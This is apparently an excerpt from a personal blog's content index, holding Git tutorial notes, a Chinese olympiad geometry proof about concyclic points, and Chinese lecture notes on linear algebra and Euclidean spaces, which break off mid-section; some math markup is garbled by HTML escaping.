pseudocode.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">type</span> blob <span class="token operator">=</span> array<span class="token operator">&lt;</span>byte<span class="token operator">&gt;</span><span class="token builtin">type</span> tree <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> tree <span class="token operator">|</span> blob<span class="token operator">&gt;</span><span class="token builtin">type</span> commit <span class="token operator">=</span> struct <span class="token punctuation">{</span>    parents<span class="token punctuation">:</span> array<span class="token operator">&lt;</span>commit<span class="token operator">&gt;</span>    author<span class="token punctuation">:</span> string    message<span class="token punctuation">:</span> string    snapshot<span class="token punctuation">:</span> tree<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Objects-and-Content-Addressing"><a href="#Objects-and-Content-Addressing" class="headerlink" title="Objects and Content-Addressing"></a>Objects and Content-Addressing</h3><p>An “object” is a blob, tree, or commit. In Git data store, all objects are content-addressed by <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1 hash</a>.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">type</span> <span class="token builtin">object</span> <span class="token operator">=</span> blob <span class="token operator">|</span> tree <span class="token operator">|</span> commitobjects <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token operator">&gt;</span><span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span> <span class="token operator">=</span> sha1<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span>    objects<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">object</span><span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> objects<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p>Git’s solution is human-readable names for SHA-1 hashes, called “references”. References are mutable pointers to commits. For example, the <code>master</code> reference usually points to the latest commit in the main branch of development. Moreover, “where we currently are” is a special reference called “HEAD”.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">references <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> string<span class="token operator">&gt;</span><span class="token keyword">def</span> <span class="token function">update_reference</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    references<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span><span class="token keyword">def</span> <span class="token function">read_reference</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> references<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">load_reference</span><span class="token punctuation">(</span>name_or_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> name_or_id <span class="token keyword">in</span> references<span class="token punctuation">:</span>        <span class="token keyword">return</span> load<span class="token punctuation">(</span>references<span class="token punctuation">[</span>name_or_id<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> load<span class="token punctuation">(</span>name_or_id<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Repositories"><a href="#Repositories" class="headerlink" title="Repositories"></a>Repositories</h3><p>A Git <em>repository</em> is the data <code>objects</code> and <code>references</code>.</p><h2 id="Staging-Area"><a href="#Staging-Area" class="headerlink" title="Staging Area"></a>Staging Area</h2><p>For example, imagine a scenario where you have debugging print statements added all over your code, along with a bugfix; you want to commit the bugfix while discarding all the print statements.</p><p>Git accommodates such scenarios by allowing you to specify which modifications should be included in the next snapshot through a mechanism called the “staging area”.</p><h2 id="Command-Line-Interface"><a href="#Command-Line-Interface" class="headerlink" title="Command-Line Interface"></a>Command-Line Interface</h2><h3 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h3><ul><li><code>git help &lt;command&gt;</code>: get help for a command</li><li><code>git init</code>: create a new git repo with data stored in the <code>.git</code> directory</li><li><code>git status</code>: tell what is going on</li><li><code>git add &lt;filename&gt;</code>: add files to staging area</li><li><code>git commit</code>: create a new commit<ul><li>Write <a href="https://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html">good commit messages</a>!</li><li>More reasons to write <a href="https://chris.beams.io/posts/git-commit/">good commit messages</a>!</li></ul></li><li><code>git log</code>: show a flattened log of history</li><li><code>git log --all --graph --decorate</code>: visualizes history as a DAG</li><li><code>git diff &lt;filename&gt;</code>: show changes made to the staging area</li><li><code>git diff &lt;revision&gt; &lt;filename&gt;</code>: show differences in a file between snapshots</li><li><code>git checkout &lt;revision&gt;</code>: update HEAD and current branch</li></ul><h3 id="Branching-and-Merging"><a href="#Branching-and-Merging" class="headerlink" title="Branching and Merging"></a>Branching and Merging</h3><ul><li><code>git branch</code>: show branches</li><li><code>git branch &lt;name&gt;</code>: create a branch</li><li><code>git checkout -b &lt;name&gt;</code>: create a branch and switch to it</li><li><code>git merge &lt;revision&gt;</code>: merge into current branch</li><li><code>git mergetool</code>: use a fancy tool to help resolve merge conflicts</li><li><code>git rebase</code>: rebase set of patches onto a new base</li></ul><h3 id="Remotes"><a href="#Remotes" class="headerlink" title="Remotes"></a>Remotes</h3><ul><li><code>git remote</code>: list remotes</li><li><code>git remote add &lt;name&gt; &lt;url&gt;</code>: add a remote</li><li><code>git push &lt;remote&gt; &lt;local branch&gt;:&lt;remote branch&gt;</code>: send objects to remote and update remote reference</li><li><code>git branch --set-upstream-to=&lt;remote&gt;/&lt;remote branch&gt;</code>: set up correspondence between local and remote branch</li><li><code>git fetch</code>: retrieve objects/references from a remote</li><li><code>git pull</code>: same as <code>git fetch; git merge</code></li><li><code>git clone</code>: download repository from remote</li></ul><h3 id="Undo"><a href="#Undo" class="headerlink" title="Undo"></a>Undo</h3><ul><li><code>git config</code>: Git is <a href="https://git-scm.com/docs/git-config">highly customizable</a></li><li><code>git clone --depth=1</code>: shallow clone, without entire version history</li><li><code>git add -p</code>: interactive staging</li><li><code>git rebase -i</code>: interactive rebasing</li><li><code>git blame</code>: show who last edited which line</li><li><code>git stash</code>: temporarily remove modifications to working directory</li><li><code>git bisect</code>: binary search history</li><li><code>.gitignore</code>: <a href="https://git-scm.com/docs/gitignore">specify</a> intentionally untracked files to ignore</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/2022/09/19/ji-he-yi-kui-09-19/"/>
      <url>/2022/09/19/ji-he-yi-kui-09-19/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>$I$是$\triangle ABC$内心, $P, Q$是$I$在$AB, AC$上的投影, 直线$PQ$交$\triangle ABC$的外接圆于$X, Y$两点, $B, I, P, X$共圆. 求证: $C, I, Q, Y$四点共圆.</p><p><strong>Proof:</strong></p><p>由$\angle API=\angle AQI=90^\circ$, 得$A, P, I, Q$四点共圆.</p><p>故<script type="math/tex">\angle BIX+\angle BIC=\angle BPX+90^\circ + \frac{1}{2}\angle BAC=180^\circ.</script></p><p>即$C, I, X$三点共线. 又因为$B, I, P, X$四点共圆, </p><p>知$\angle BXI=\angle BPI=90^\circ$, 即$BX\perp CX$, $BC$为$\odot ABC$的直径, $AB\perp AC$.</p><p>从而四边形$APIQ$为正方形. 取弧$\mathop{AC}\limits^{\frown}$中点$Z$, 由鸡爪定理知$ZA=ZI=ZC$成立.</p><p>从而点$Z$位于线段$AI$的垂直平分线上. 又正方形$APIQ$中, $PQ$垂直平分$AI$,</p><p>故点$Z$位于直线$PQ$上, $P, Q, Z$三点共线. 又显然点$Z$与点$X$不重合,</p><p>故点$Z$与点$Y$重合, $Y$为弧$\mathop{AC}\limits^{\frown}$中点. </p><p>由鸡爪定理知$B, I, Y$三点共线. </p><p>进而$\angle IYC=\angle BYC=90^\circ=\angle IQC$, </p><p>即$C, I, Q, Y$四点共圆.</p><p><img src="/pic/05.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高等代数选讲</title>
      <link href="/2022/09/16/gao-deng-dai-shu-xuan-jiang/"/>
      <url>/2022/09/16/gao-deng-dai-shu-xuan-jiang/</url>
      
        <content type="html"><![CDATA[<h2 id="Chapter-1-抽象线性空间理论"><a href="#Chapter-1-抽象线性空间理论" class="headerlink" title="Chapter 1 抽象线性空间理论"></a>Chapter 1 抽象线性空间理论</h2><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间 $\mathcal{U, V}$, 用 $\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}$ 表示从 $\mathcal{U}$ 到 $\mathcal{V}$ 的线性映射的全体.  </li><li>容易验证 $\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}$ 同时也是 $\mathbb{F}$ 上的线性空间.</li></ul><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathcal{Hom}_{\mathbb{R}}(\mathbb{R}^n, \mathbb{R}^m)$ 表示全体 $m\times n$ 矩阵.</li></ul><h3 id="Property-1"><a href="#Property-1" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li>对 $f\in\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}, g\in\mathcal{Hom}_{\mathbb{F}}\mathcal{(V, W)}$, 有 $g\circ f\in\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, W)}$.</li></ul><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定线性空间 $\mathcal{U, V}$, 若存在线性双射 $f:\mathcal{U}\rightarrow\mathcal{V}$, 则称 $\mathcal{U, V}$ 线性同构, 同构定义了一种等价关系.</li></ul><h3 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>如何考虑以同构为基础的线性空间分类?</li><li>对 $n$ 维线性空间 $\mathcal{V}/\mathbb{F}$ 的一组基为 $e_1, \dots, e_n$, 考虑映射 $\sigma_{e_1,\dots, e_n}:\mathcal{V}\rightarrow\mathbb{F}^n, x\rightarrow (x_1, \dots, x_n)^T$.<ul><li>其中 $x=\sum_{i=1}^n{x_ie_i}=(e_1, \dots, e_n)(x_1, \dots, x_n)^T$, 此时 $\sigma_{e_1,\dots, e_n}$ 为 $\mathbb{F}$ 上的线性同构.</li></ul></li></ul><h3 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>对于 $n$ 维线性空间 $\mathcal{V}$ 的两组基 $(e_1, \dots, e_n)$ 与 $(t_1, \dots, t_n)$,<br>$(t_1, \dots, t_n)=(e_1, \dots, e_n)\left( \begin{matrix}<br>t_{11}&amp;        \cdots&amp;        t_{1n}\\<br>\vdots&amp;        &amp;        \vdots\\<br>t_{n1}&amp;        \cdots&amp;        t_{nn}\\<br>\end{matrix} \right)  =(e_1, \dots, e_n)T$, 称 $T$ 为过渡矩阵.</li><li>对$\forall x\in\mathcal{V}$, <ul><li>若 $x=(e_1, \dots, e_n)(x_1, \dots, x_n)^T=(t_1, \dots, t_n)(y_1, \dots, y_n)^T$,<br>那么有 $(x_1, \dots, x_n)^T=T(y_1, \dots, y_n)^T$, 这是由基的表示法的唯一性所决定的.</li></ul></li></ul><h3 id="Definition-4"><a href="#Definition-4" class="headerlink" title="Definition 4"></a>Definition 4</h3><ul><li>$n$ 维线性空间 $\mathcal{U}/\mathbb{F}$, 其上一组基为 $(e_1, \dots, e_n)$; </li><li>$m$ 维线性空间 $\mathcal{V}/\mathbb{F}$, 其上一组基为 $(i_1, \dots, i_m)$. </li><li>考虑从 $\mathcal{U}$ 到 $\mathcal{V}$ 的线性映射 $f$:<ul><li>由 $f(e_1)=(i_1, \dots, i_m)(F(\vec{e_1}))$, 进而有</li><li>$(f(e_1), \dots, f(e_n))=(i_1, \dots, i_m)(F(\vec{e_1}), \dots, F(\vec{e_n}))=(i_1, \dots, i_m)F$.</li></ul></li><li>称 $F$ 为基 $e_1,\dots, e_n, i_1, \dots, i_m$ 下的表示矩阵.</li></ul><h3 id="Tip-1"><a href="#Tip-1" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>$\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}\xrightarrow{\sigma_{e_1,\dots, e_n, i_1, \dots, i_m}}\mathbb{F}^{m\times n}$ 是一个同构映射.</li></ul><h3 id="Tip-2"><a href="#Tip-2" class="headerlink" title="Tip 2"></a>Tip 2</h3><ul><li>表示矩阵相乘表示基底相传递.</li></ul><h3 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>线性映射在不同基下的表示矩阵如何变化?<ul><li>$\mathcal{U}:(t_1, \dots, t_n)=(e_1, \dots, e_n)T$,</li><li>$\mathcal{V}:(s_1, \dots, s_m)=(i_1, \dots, i_m)S$,</li><li>线性映射 $f:\mathcal{U}\rightarrow\mathcal{V}$.</li></ul></li><li>记 $\sigma_{e_1,\dots, e_n, i_1, \dots, i_m}(f) = F$, 则 $\sigma_{t_1,\dots, t_n, s_1, \dots, s_m}(f) = S^{-1}FT$.</li></ul><h3 id="Tip-3"><a href="#Tip-3" class="headerlink" title="Tip 3"></a>Tip 3</h3><ul><li>$\mathcal{U}:(q_1, \dots, q_n)=(e_1, \dots, e_n)Q$,<ul><li>其中 $(q_1, \dots, q_n), (e_1, \dots, e_n)$ 是 $\mathcal{U}$ 的两组标准正交基,</li><li>线性映射 $f:\mathcal{U}\rightarrow\mathcal{U}$.</li></ul></li><li>记 $\sigma_{e_1,\dots, e_n}(f) = F$, 则 $\sigma_{q_1,\dots, q_n}(f) = Q^{-1}FQ = Q^TFQ$.</li><li>这也就是说：<ul><li>$n$ 阶方阵 $A, B$ 正交相似 $\Longleftrightarrow A, B$ 是 $n$ 维线性空间某个线性变换在两组标准正交基下的矩阵.</li></ul></li></ul><h2 id="Chapter-2-欧氏空间"><a href="#Chapter-2-欧氏空间" class="headerlink" title="Chapter 2 欧氏空间"></a>Chapter 2 欧氏空间</h2><h3 id="Definition-1-1"><a href="#Definition-1-1" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间 $\mathcal{V}/\mathbb{R}$, $\left&lt;\cdot, \cdot\right&gt;:\mathcal{V}\times\mathcal{V}\rightarrow\mathbb{R}$, 满足 $\forall a,b\in\mathcal{V}$, 有<ul><li>$a)$ 对称性: $\left<a, b\right=""> = \left<b, a\right="">$;</b,></a,></li><li>$b)$ 双线性性: $\left<k_1a_1+k_2a_2, b\right=""> = k_1\left<a_1, b\right=""> + k_2\left<a_2, b\right="">$;</a_2,></a_1,></k_1a_1+k_2a_2,></li><li>$c)$ 正定性: $\left<a, a\right=""> \ge 0$, 取等当且仅当 $a = 0$.</a,></li></ul></li><li>则称二元函数是 $\mathcal{V}$ 上的一个内积, 具有内积的线性空间称为一个实内积空间,或欧氏空间.</li></ul><h3 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{R}^n\quad \left<a, b\right=""> = a^Tb$ 是 $\mathbb{R}^n$上的标准内积. </a,></li><li>现在考虑一般的情况 $\left<a, b\right=""> = a^TAb$, 其中 $A\in\mathbb{R}^{n\times n}$. <ul><li>为了满足对称性 $\left<a, b\right=""> = a^TAb = \left<b, a\right=""> =  b^TAa = a^TA^Tb$, 需要 $A$ 对称;</b,></a,></li><li>为了满足正定性 $\left<a, a\right=""> = a^TAa \ge 0$, 需要 $A$ 正定; </a,></li></ul></a,></li><li>此时双线性性是显然满足的; </li><li>所以只要 $A$ 对称正定, $\mathbb{R}^n$ 上的二元函数 $\left(a, b\right)\rightarrow a^TAb$ 是内积.</li></ul><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathbb{R}^{m\times n}\quad \left<a, b\right=""> = trace(B^TA)$ 是 $\mathbb{R}^{m\times n}$ 上的标准内积. </a,></li></ul><h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><ul><li>$\mathcal{C}\left[a, b\right]\quad \left<f, g\right=""> = \int_a^b{f\left( x \right) g\left( x \right) dx}$ 是 $\mathcal{C}\left[a, b\right]$ 上的标准内积.</f,></li></ul><h3 id="Definition-2-1"><a href="#Definition-2-1" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>定义向量的长度 $\left| a \right|=\sqrt{\left<a,a\right>}$, 对 $a\in\mathcal{V}$;</a,a\right></li><li>定义向量间的距离为 $\left| a-b \right|$, 对 $a, b\in\mathcal{V}$.</li></ul><h3 id="Property-1-1"><a href="#Property-1-1" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li><p>$(Cauchy-Schwarz\ Inequality)$</p><p>$\left| \left&lt; a, b \right&gt; \right|$ ≤ $\left| a \right| \cdot \left| b \right| $.</p></li></ul><h3 id="Property-2"><a href="#Property-2" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li><p>$(Triangular\ Inequality)$</p><p>$\left| a+b \right|$ ≤ $\left| a \right| + \left| b \right| $.</p></li></ul><h3 id="Definition-3-1"><a href="#Definition-3-1" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>在 $n$ 维欧氏空间 $\mathcal{V}$ 中, 由 $n$ 个向量组成的正交向量组称为 $\mathcal{V}$ 的一组正交基.</li><li>特别地,当这 $n$ 个向量均为单位向量时,称它们构成欧氏空间 $\mathcal{V}$ 的一组标准正交基.</li></ul><h3 id="Question-1-1"><a href="#Question-1-1" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>$\mathbb{R}^{m\times n}$上的一组标准正交基是什么?</li><li>是 $E_{ij}(1 \le i \le m, 1 \le j \le n)$, 其中 $E_{ij}$ 表示第 $i$ 行, 第 $j$ 列元素为1, 其余元素均为0的 $m\times n$ 矩阵.</li></ul><h3 id="Question-2-1"><a href="#Question-2-1" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>$Gram Schmidt$ 正交化方法如何推广到欧氏空间?</li><li>$(a_1, \dots, a_r) = (q_1, \dots, q_r)R$, $R$ 为上三角阵.</li></ul><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><ul><li>定义 $\left<f, g\right=""> = \int_{-1}^{1}{f\left( x \right) g\left( x \right) dx}$ 是 $\mathbb{R}\left[x\right]$ 上的标准内积, </f,></li><li>对 $1, x, x^2, \dots$ 这组基进行 $Gram Schmidt$ 正交化(这里 $\mathbb{R}\left[x\right]$ 指实数域 $\mathbb{R}$ 上的多项式空间).</li><li>这里不妨考虑简单情形, 对 $q_1=1, q_2=x, q_3=x^2$ 进行 $Gram Schmidt$ 正交化, 得到 $\tilde{q}_1=1, \tilde{q}_2=x, \tilde{q}_3=x^2 - \frac{1}{3}$.</li></ul><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul><li>基扩充定理可以直接推广至欧氏空间, i.e.有限维欧氏空间中任意正交向量组可以扩充为一组相应的正交基.</li></ul><h3 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3"></a>Question 3</h3><ul><li>如何利用坐标计算内积?</li><li>欧氏空间 $\mathcal{V}$ 一组基底为 $a_1,a_2,\dots,a_n$, $x,y\in\mathcal{V}$, 在这组基下的坐标分别为 $(x_1,\dots,x_n)^T, (y_1,\dots,y_n)^T$,<ul><li>$\left<x, y\right=""> = \left&lt;\sum_{i = 1}^n{a_ix_i}, \sum_{j = 1}^n{a_jy_j}\right&gt; =<br>\sum_{i = 1}^n\sum_{j = 1}^n x_iy_j\left<a_i, a_j\right=""> = {\hat{x}}^TG\hat{y},$</a_i,></x,></li></ul></li><li>其中 $G$ 称为内积在基 $a_1,a_2,\dots,a_n$ 下的 $Gram$ 矩阵, $\hat{x}$, $\hat{y}$ 称为 $x, y$ 在这组基下的坐标.</li></ul><h3 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4"></a>Question 4</h3><ul><li>当基改变时, 度量矩阵如何改变?<ul><li>$x = (e_1, \dots, e_n)\hat{x} = (t_1, \dots, t_n)\tilde{x}$,</li><li>$y = (e_1, \dots, e_n)\hat{y} = (t_1, \dots, t_n)\tilde{y}$,</li></ul></li><li>设内积在基 $(e_1, \dots, e_n)$ 下的 $Gram$ 矩阵为 $G$, 在基 $(t_1, \dots, t_n)$ 下的 $Gram$ 矩阵为 $\tilde{G}$, 容易得到</li></ul><script type="math/tex; mode=display">\begin{aligned}\tilde{x}^T\tilde{G}\tilde{y} &= \left<(t_1, \dots, t_n)\tilde{x}, (t_1, \dots, t_n)\tilde{y}\right> \\                      &= \left<(e_1, \dots, e_n)\hat{x}, (e_1, \dots, e_n)\hat{y}\right> \\                      &= \left<(e_1, \dots, e_n)(T\tilde{x}), (e_1, \dots, e_n)(T\tilde{y})\right> \\                      &= (T\tilde{x})^TG(T\tilde{y}) \\                      &= \tilde{x}^T(T^TGT)\tilde{y}\end{aligned}, \forall\tilde{x}, \tilde{y},</script><ul><li>其中 $(t_1, \dots, t_n) = (e_1, \dots, e_n)T$.</li></ul><h3 id="Property-3"><a href="#Property-3" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$\mathcal{V}$ 为欧氏空间, $\left(e_1, \dots, e_n\right)$ 为标准正交基, $T$ 为 $n$ 阶方阵, $(t_1, \dots, t_n) = (e_1, \dots, e_n) T$, 则<ul><li>$(t_1, \dots, t_n)$ 为一组标准正交基 $\Longleftrightarrow T$ 是正交阵.</li></ul></li></ul><h3 id="Definition-4-1"><a href="#Definition-4-1" class="headerlink" title="Definition 4"></a>Definition 4</h3><ul><li>对欧氏空间 $\mathcal{V}$ 与 $\mathcal{U}$, 如果 $\mathcal{U}\subset\mathcal{V}$, 则称 $\mathcal{U}$ 为 $\mathcal{V}$ 的子空间.</li></ul><h3 id="Definition-5"><a href="#Definition-5" class="headerlink" title="Definition 5"></a>Definition 5</h3><ul><li>$\mathcal{M}$ 是欧氏空间 $\mathcal{V}$ 的子欧氏空间, 称 ${\mathcal{M}}^{\bot} = \left\{a \in \mathcal{V} \mid \left<a, b\right=""> = 0, \forall b \in \mathcal{V}\right\}$ 为其正交补.</a,></li></ul><h3 id="Property-4"><a href="#Property-4" class="headerlink" title="Property 4"></a>Property 4</h3><ul><li>$\mathcal{M}^{\bot}$ 是欧氏空间 $\mathcal{V}$ 的子空间.</li></ul><h3 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5"></a>Question 5</h3><ul><li>$\mathcal{M, N}$ 是 $\mathcal{V}$ 的子空间, 是否存在同时包含 $\mathcal{M, N}$ 的属于 $\mathcal{V}$ 的最小子空间?</li><li>考虑 $\left\{m + n\mid m\in\mathcal{M}, n\in\mathcal{N}\right\}$, 称为 $M$ 和 $N$ 的和, 记作 $\mathcal{M}+\mathcal{N}$, 它满足所需要求.</li></ul><h3 id="Property-5"><a href="#Property-5" class="headerlink" title="Property 5"></a>Property 5</h3><ul><li><script type="math/tex; mode=display">\begin{equation}\mathcal{M}\cap \mathcal{M}^{\bot} = \varnothing\end{equation}</script></li></ul><script type="math/tex; mode=display">\begin{equation}\mathcal{M} + \mathcal{M}^{\bot} = \mathcal{V}\end{equation}</script><ul><li>设 $\mathcal{M}$ 的一组正交基为 $q_1, \dots, q_r$, 根据基扩充定理, 可扩充 $q_{r+1}, \dots, q_n$,<br>使得 $(q_1, q_2, \dots, q_n)$ 构成 $\mathcal{V}$ 的一组正交基, 那么 ${\mathcal{M}}^{\bot}$ 的一组正交基即为 $q_{r+1}, \dots, q_n$.</li></ul><h3 id="Property-6"><a href="#Property-6" class="headerlink" title="Property 6"></a>Property 6</h3><ul><li>$dim(\mathcal{M})+dim(\mathcal{M}^{\bot})=dim(\mathcal{V})$.</li><li>$(\mathcal{M}^{\bot})^{\bot} = \mathcal{M}$.</li></ul><h2 id="Chapter-3-欧氏空间上的线性映射"><a href="#Chapter-3-欧氏空间上的线性映射" class="headerlink" title="Chapter 3 欧氏空间上的线性映射"></a>Chapter 3 欧氏空间上的线性映射</h2><h3 id="Definition-1-2"><a href="#Definition-1-2" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;_{\mathcal{U}}\right)$, $\left(\mathcal{V}, \left&lt; \cdot, \cdot\right&gt;_{\mathcal{V}}\right)$, $f\in\mathscr{Hom}\mathcal{(U, V)}, g\in\mathscr{Hom}\mathcal{(V, U)}$,</li><li>使得 $\forall x\in\mathcal{U},y\in\mathcal{V}$, 有<script type="math/tex">\left<f(x),y\right>_{\mathcal{V}}=\left<x,g(y)\right>_{\mathcal{U}},</script><br>则称 $g$ 为 $f$ 的共轭映射或伴随映射, $g=f^*$.</li></ul><h3 id="Property-1-2"><a href="#Property-1-2" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li>$\left(f^<em>\right)^</em>=f$.<ul><li>$\forall x\in\mathcal{U},y\in\mathcal{V}$,<br>有 $\left&lt;(f^<em>)^</em>(x),y\right&gt;_{\mathcal{V}}=\left<y,(f^*)^*(x)\right>_{\mathcal{V}}=\left<f^*(y),x\right>_{\mathcal{U}}=\left<x,f^*(y)\right>_{\mathcal{U}}=\left<f(x),y\right>_{\mathcal{V}}$,<br>从而 $\left&lt;(f^<em>)^</em>(x)-f(x),y\right&gt;_{\mathcal{V}}=0$, $\forall x\in\mathcal{U},y\in\mathcal{V}$.<br>故 $(f^<em>)^</em>(x)-f(x)=0$, $\forall x\in\mathcal{U}$.<br>进而有 $\left(f^<em>\right)^</em>=f$ 成立.</f(x),y\right></x,f^*(y)\right></f^*(y),x\right></y,(f^*)^*(x)\right></li></ul></li></ul><h3 id="Property-2-1"><a href="#Property-2-1" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li>$(g\circ f)^<em>=f^</em>\circ g^*$.</li></ul><h3 id="Question-1-2"><a href="#Question-1-2" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>如何从矩阵的角度理解伴随映射? <ul><li>$1)$ 基本情形: 考虑 $\mathcal{U}=\mathbb{R}^n, \mathcal{V}=\mathbb{R}^m$ 及其上的标准内积,<script type="math/tex; mode=display">f\in\mathcal{Hom}\mathcal{(U, V)}\xrightarrow{\quad\quad\quad\quad}A\in\mathbb{R}^{m\times n}, x\rightarrow Ax, x\in\mathbb{R}^n;</script><script type="math/tex; mode=display">f^*\in\mathcal{Hom}\mathcal{(V, U)}\xrightarrow{\quad\quad\quad\quad}B\in\mathbb{R}^{n\times m}, y\rightarrow By, y\in\mathbb{R}^n.</script>$\forall x\in\mathbb{R}^n, y\in\mathbb{R}^m$,<br>有 $y^TAx=\left<ax,y\right>=\left<f(x),y\right>=\left<x,f^*(y)\right>=\left<x,by\right>=y^TB^Tx$,<br>进而 $A=B^T$ 成立.</x,by\right></x,f^*(y)\right></f(x),y\right></ax,y\right></li><li>$2)$ 一般情形: 假定 $\mathcal{U},\mathcal{V}$ 的一组标准正交基分别为<script type="math/tex; mode=display">u_1, u_2, \dots, u_n, v_1, v_2, \dots, v_m.</script>考虑 $\left&lt;(f(u_i),v_j\right&gt;_{\mathcal{V}}=\left<u_i, f^*(v_j)\right="">_{\mathcal{U}}, \forall 1\le i\le n, 1\le j\le m$.<br>其中:<br>$LHS=\left&lt;(v_1, \dots, v_m)(f_{1i}, \dots, f_{mi})^T, v_j\right&gt;_{\mathcal{V}}=\left&lt;\sum_{k=1}^mv_kf_{ki},v_j\right&gt;_{\mathcal{V}}=f_{ji}$,<br>$RHS=\left<u_i, (u_1,="" \dots,="" u_n)(g_{1j},="" g_{nj})^t\right="">_{\mathcal{U}}=\left<u_i,\sum_{k=1}^nu_kg_{kj}\right>_{\mathcal{V}}=g_{ij}$,<br>因此 $\forall 1\le i\le n, 1\le j\le m, f_{ji}=g_{ij}$ 成立. 即 $F=G^T$.</u_i,\sum_{k=1}^nu_kg_{kj}\right></u_i,></u_i,></li></ul></li></ul><h3 id="Definition-2-2"><a href="#Definition-2-2" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;\right)$, $f\in\mathcal{Hom}\mathcal{(U, U)}$, 若 $\forall x,y\in\mathcal{U}$, 有<script type="math/tex">\left<f(x),y\right>=\left<x,f(y)\right>,</script><br>则称 $f$ 为 $\mathcal{U}$ 上的一个自伴变换(对称变换).</li></ul><h3 id="Property-3-1"><a href="#Property-3-1" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$, $dim\mathcal{U}=n$.<ul><li>$1)$ $f$ 为对称变换 